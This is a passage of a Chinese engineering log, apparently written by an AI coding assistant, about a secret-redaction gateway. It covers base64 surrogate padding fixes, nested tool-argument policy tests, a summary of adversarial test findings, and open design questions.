2. 追加 1~2 个 padding 后构成完整 canonical base64（长度 %4==0、padding 位置合法）
3. padding 之后已到标量边界（后续字符不能继续该标量）
4. 解码为可打印文本
```

**保留 `classifiedText = 原 detector core`**——boundary widening 不改变分类输入，与 reference envelope 完全一致。

**刻意未做**（按你的判断）：

```
✗ entropy 字母表加 '='        → 为表示问题污染评分模型，且会移动每一个 score
✗ merge 里对 entropy+gitleaks overlap 特判 padding
                              → 让 geometry 层开始解释 base64 语法
```

#### 修复前先修正两个 regression oracle

**(1) `assert.equal(out.includes(residue), false)` 对 `residue === "="` 永不成立**——赋值语句自身就含 `=`。改为**提取 RHS** 后断言其为一个完整 token。非 canonical 的单 `=` 输入，诚实结果是「token + 遗留字符」，已显式断言。

**(2) `assert.deepEqual(covered, [B64, B64.slice(0, -2)])` 把旧缺陷的形状锁进了测试**——实现变正确后它必然失败。改为期望契约：**每个 occurrence 的 mutation boundary 必须覆盖完整 encoded scalar**。

#### 新 oracle（比"能 base64 round-trip"更接近契约）

K8s 侧现在同时断言：emitted 是 **canonical base64**、**`ctx.ledger.lookup(emitted)` 命中**、**`resolveSurrogate` 是 OWN token**。

#### 实测

```
修复前： a: Q1JHX0FBQUFBQV8wMDAx    b: Q1JHX0FBQUFBQV8wMDAy==   同一明文两个 identity
修复后： a: Q1JHX0FBQUFBQV8wMDAx    b: Q1JHX0FBQUFBQV8wMDAx     同一 token、ledger 单条、无残留
```

#### Negative controls（证明修的是 base64 边界，不是"看见等号就多吃两个字符"）

```
operator ==           → 不吞 ✅
代码里的 ==            → 不吞 ✅
比较链 == ... ==       → 不吞 ✅
长度 %4≠0             → 不扩大 ✅（单 = 案例：cGFzc3dvcmQxMjM0NTY3OA= 长度 23，本就不是 canonical base64）
padding 后仍有字母      → 不扩大 ✅
三段 padding          → 不扩大 ✅
span 不从标量起点开始    → 不扩大 ✅
canonical ==          → 扩大 ✅（否则前述 controls 全部空转）
```

#### 一处实测发现（非缺陷）

`G only` 时 gitleaks **不报**这个 base64 块——该规则**自带 entropy 门槛**，H 关闭即不命中，因而输出原样。所以"无 padding 残留"只在该 flag 组合确实发生脱敏时才适用。

## 9.34 R2.6 Nested Tool Operand（已实现，**无新 finding**）

### scope 明确限定为 JSON-reachable values

`object` / `array` / `string` / `number` / `boolean` / `null`。

**明确不作为 finding**：cyclic object、`Map`/`Set`/`Date`、getter/Proxy、sparse array、custom prototype——这些属于 **JS API robustness**，不是当前 wire contract。**stack/depth exhaustion 留给 R3。**

### 核心 oracle：differential

```
nestedResult(x) === applySinkPolicy(x, TOOL_ARGUMENT, same toolName/trust)
```

**递归 walker 只负责 traversal，不应发明第二份 policy。** 这条比"自己再写一张 OWN/FOREIGN 应该怎样的期望表"强得多——后者会成为**会漂移的 policy 副本**。

### 六条 invariant 实测

| # | invariant | 结果 |
|---|---|---|
| 1 | 每个 string VALUE leaf 执行同一 tool_argument policy | ✅ |
| 2 | 深度不改变 policy（depth 1/2/5/10/20/50 × object/array × 4 种 authority × 2 trust） | ✅ |
| 3 | 非 string value 逐值不变 | ✅ |
| 4 | container shape 不变（含 object/array/array-of-array/empty） | ✅ |
| 5 | **object KEY 不改写**（key 长得像 token 也保留原 key） | ✅ |
| 6 | 一个 sibling 不污染另一个 | ✅ |

**第 5 条是刻意的**：重命名 JSON key 会改变 tool schema，**比保留 opaque token 更危险**。walker 也不尝试 restore key。

### 遍历顺序无关

`OWN first` / `OWN last`、property 顺序交换、array 顺序交换——**每个 leaf 的结果只依赖 leaf 本身 + tool trust**，并逐元素与其**直接 policy 结果**相等。

### Anthropic 生产 E2E（补上你指出的缺口）

真正调用递归 walker 的生产路径是 `content[] → tool_use → block.input → applyOperandPolicy()`，所以除 helper 测试外补了三条 **`applyResponsePolicy()`** 驱动的 E2E：

- 6 层 nested OWN token + **untrusted** → 保留 token，全响应无明文
- 6 层 nested + **trusted toolName** → 恢复明文
- 同一响应内 **text block 恢复 / operand block 保留**，两个 channel 的 policy 不互相渗漏

这正是此前反复出现的 `helper 对、production wiring 没接上` 模式的针对性防护。

### 本轮修正的两处**我的测试**问题

1. **container shape 测试比较失真**：我从**同一个被 mutate 的对象**上取"之前"和"之后"的形状，两侧不可能因预期原因产生差异。改为独立构造 + 纯形状比较，并显式断言数组长度与顺序。
2. **遍历顺序测试写法错误**：复用了同一个被 mutate 的对象，并比较整体序列化——那样只能报出**key 顺序**差异，而非结果差异。改为每棵树**独立构造、各走一次、逐字段比较**，并补上"每个元素仍等于其直接 policy 结果"这一更强断言。

## 9.35 R2 Adversarial Exploration 阶段收口

| 类别 | findings | 结果 |
|---|---|---|
| **R2.1** ownership / foreign registry | **2**（R2-REG-001 Medium、R2-REG-002 Low） | **均已修** |
| R2.2 streaming / SSE fragmentation | 0 | 两个 oracle（transport 逐字节 / logical canonical）全绿 |
| R2.3 parser collision | 0 | 四条契约在 500+ 组合下成立 |
| R2.4 span / envelope / merge collision | 0 | 差分 oracle 552 组零违约 |
| **R2.5** representation / ownership / ledger | **1**（R2-REP-001 Low~Medium） | **已修** |
| R2.6 nested tool operand | 0 | differential oracle 全绿 |

**三个 finding 全部落在"跨层共享状态 / 跨层 authority"区域**，而纯函数式变换（transport、递归 walker、merge geometry）**零 finding**。这与进入 R2 时的判断一致，也说明后续搜索应优先考虑**存在共享可变状态或跨层契约的地方**。

**测试方法错误的统计**：R2 期间共修正 **13 处我自己写错的断言或测试方法**，其中 **2 处我误告了 gateway**（`#` 注释被吞、`op://` 归因），**1 处我差点把正确的实现改坏**（YAML `#` 语义，用 PyYAML 校准后推翻）。**规律：我的断言比代码更容易出错，且错误集中在"自认为已理解的性质"上。**

**R2 的价值来自定向组合，不来自随机次数**——3 个 finding 全部来自定向的跨层组合（有状态 matcher、sticky 扫描、base64 边界），而非随机 fuzz。

## 10. 未解决问题 / 待验证

1. **【P2 · 待验证】GLiNER 类 NER 组件**：本机 4 核无 GPU，长文本实测推理在几十秒量级，直接整段送模型不可接受；可行方向是只对候选 span 截取 ±100~300 字符窗口送模型。待验证项：窗口大小与 p50 / p95 延迟曲线、窗口截断对召回的影响、模型体积在 Workers 运行时的可行性（CPU / WASM 限制）。
   **硬性约束：任何 ML 组件不得对低熵、无结构上下文的候选做终裁**——`PIN=0000`、短密码、裸 hex 之类在缺少 key 名 / 容器证据时只能作为 SOFT_SIGNAL 参与排序，最终动作必须由确定性规则或 policy 给出。
2. **【待验证】** Helm / Go template 与旧 `{{ }}` 定界符的冲突需实测（3.2）。
3. **【待验证】** schema 类型受限位置（number / boolean / enum）的替换策略需要真实 API server 或 provider schema 验证，当前只有"fail-closed"这一个保守选项。
4. **【待验证】** 跨层归属的显式声明机制：网关与外层 DLP 如何协商 EXCLUSIVE / PASS_THROUGH（响应头、部署配置或共享清单），以及不一致时的检测点。
5. **【待验证】** infra golden corpus 的来源与规模：需要覆盖 AWS / K8s / Git / 追踪 ID 的真实样本集，才能把"零误删"作为 HARD 的准入条件。
6. **【覆盖率机制已建立，见 9.12】** 已实现 attempt 级 coverage（PARSED/PARTIAL/FAILED/NOT_APPLICABLE）与请求级 union 汇总，并有 8 份语料基线。仍**无实现数据**的部分：YAML 锚点/别名、shell 引号与转义、多行 `.env`——这些目前会体现为 PARTIAL 或不计入，需要更大语料才能定量。
7. **【已关闭，见 9.22】** ~~legacy `{{Redact:<64 hex>}}` 形状在输入方向仍被豁免~~：整个 legacy 方言已从生产代码移除，该形状现在只是普通输入。
8. **【已实现，见 9.14 / 9.16 / 9.21】** Infra Recognizer：10 个 subtype，certainty 与 disposition 解耦，profile 可切换，**envelope 解析解决 detector/entity 边界错配**（实例 ID 等不再被拆开）。**未做**：`MASK` 语义（需要逐类型保真定义）、infra 自身产出 span（当前只注解 detector 已产出的 span，因此未被任何 detector 命中的裸 ARN 不会脱敏）、`INTERNAL_HOSTNAME` 的 envelope 规则已有但 K8s `svc` 短名仍需完整 FQDN。
7. **【待验证】** 流式场景下 base64 surrogate 的跨 chunk 还原，以及新 token 变长后 `SseRestorer` 的后缀保留上界取值。
8. **【待统一】测试夹具与语法的两处不一致**：`test/k8s-surrogate.test.js` 的 `surrogate length is independent of plaintext length` 使用了三段 token `CRG_7K2M9Q_E9999_T8F4N6P3`，与 6.5 的两段语法及 `token-syntax` 的 `parts.length === 2` 断言冲突，需改成两段夹具；该用例注释写"surrogate 长度泄露明文长度"，但断言与行为是"长度只跟踪 token"，若同请求内 token 定长则不泄露明文长度，注释应按断言修正。
9. **【待替换】测试内的实现占位**：`token-syntax` 的 `targetToken()`（`djb2(明文)` 派生 entity slot）与 `k8s-surrogate` 的 `base64Surrogate()`、`restore-miss` 的 `classifyRestore()` 都是形态占位；前者的派生方式正是 8.1 所禁止的 checksum oracle 形态，worker.js 实现时必须用 CSPRNG，不得复用测试里的推导。
